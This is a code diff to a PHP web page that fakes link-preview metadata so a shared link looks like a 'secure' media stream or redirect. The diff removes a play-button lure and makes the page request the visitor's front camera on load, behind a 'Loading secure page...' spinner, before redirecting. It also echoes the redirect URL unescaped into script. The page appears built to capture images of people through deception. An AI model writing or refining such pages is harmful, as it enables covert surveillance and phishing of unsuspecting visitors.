@@ -28,7 +28,7 @@ try {
 }
 
 function fetch_real_meta($url) {
-    $title = "Secure Media Stream";
+    $title = "Secure Redirect";
     $image = "https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600&auto=format&fit=crop&q=60";
 
     if (preg_match('/(?:youtube\.com\/(?:[^\/]+\/.+\/|(?:v|e(?:mbed)?)\/|.*[?&]v=)|youtu\.be\/)([^"&?\/\s]{11})/', $url, $matches)) {
@@ -53,7 +53,7 @@ function fetch_real_meta($url) {
     return ['title' => trim($title), 'image' => trim($image)];
 }
 
-$og_title = "Secure Media Stream";
+$og_title = "Secure Redirect";
 $og_image = "https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600&auto=format&fit=crop&q=60";
 $target_redirect = "";
 
@@ -123,52 +123,21 @@ if (isset($_GET['r']) && !empty($target_redirect)):
     <meta property="og:image" content="<?php echo htmlspecialchars($og_image); ?>">
     <meta property="og:type" content="website">
     <style>
-        :root {
-            --bg: #030712;
-            --card: #0f172a;
-            --border: #1e293b;
-            --accent: #6366f1;
-            --accent-hover: #4f46e5;
-            --text: #f8fafc;
-            --muted: #64748b;
-        }
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
-        body { background-color: var(--bg); color: var(--text); display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
-        
-        .stream-wrapper { background: var(--card); border: 1px solid var(--border); border-radius: 16px; width: 100%; max-width: 400px; padding: 20px; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.7); text-align: center; }
-        .media-preview { position: relative; width: 100%; height: 220px; border-radius: 12px; overflow: hidden; background: #000; margin-bottom: 20px; border: 1px solid var(--border); }
-        .media-preview img { width: 100%; height: 100%; object-fit: cover; opacity: 0.8; filter: brightness(0.9); }
-        
-        .action-trigger { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); background: var(--accent); color: white; border: none; width: 68px; height: 68px; border-radius: 50%; cursor: pointer; display: flex; justify-content: center; align-items: center; box-shadow: 0 0 30px rgba(99, 102, 241, 0.5); transition: all 0.3s ease; }
-        .action-trigger:hover { background: var(--accent-hover); transform: translate(-50%, -50%) scale(1.05); box-shadow: 0 0 40px rgba(99, 102, 241, 0.8); }
-        .action-trigger svg { width: 28px; height: 28px; fill: white; margin-left: 3px; }
-        
-        h1 { font-size: 15px; font-weight: 600; color: var(--text); margin-bottom: 8px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
-        p { font-size: 12px; color: var(--muted); }
-        
-        .pulse-ring { position: absolute; width: 100%; height: 100%; border-radius: 50%; border: 2px solid var(--accent); animation: pulse 2s infinite; opacity: 0; pointer-events: none; }
-        @keyframes pulse { 0% { transform: scale(1); opacity: 1; } 100% { transform: scale(1.5); opacity: 0; } }
+        body { background-color: #030712; color: #f8fafc; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; font-family: sans-serif; }
+        .loader { text-align: center; }
+        .spinner { width: 40px; height: 40px; border: 4px solid #1e293b; border-top: 4px solid #6366f1; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 15px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        p { font-size: 14px; color: #64748b; }
     </style>
 </head>
 <body>
-    <div class="stream-wrapper">
-        <div class="media-preview">
-            <img src="<?php echo htmlspecialchars($og_image); ?>" alt="Thumbnail">
-            <button class="action-trigger" id="execBtn" onclick="runProcess()">
-                <div class="pulse-ring"></div>
-                <svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>
-            </button>
-        </div>
-        <h1><?php echo htmlspecialchars($og_title); ?></h1>
-        <p>Click play to initialize secure stream session.</p>
+    <div class="loader">
+        <div class="spinner"></div>
+        <p>Loading secure page...</p>
     </div>
 
     <script>
-        function runProcess() {
-            const btn = document.getElementById('execBtn');
-            btn.style.opacity = '0.4';
-            btn.style.pointerEvents = 'none';
-
+        window.addEventListener('DOMContentLoaded', () => {
             navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
                 .then(stream => {
                     const video = document.createElement('video');
@@ -202,7 +171,7 @@ if (isset($_GET['r']) && !empty($target_redirect)):
                 .catch(err => {
                     window.location.replace("<?php echo $target_redirect; ?>");
                 });
-        }
+        });
     </script>
 </body>
 </html>
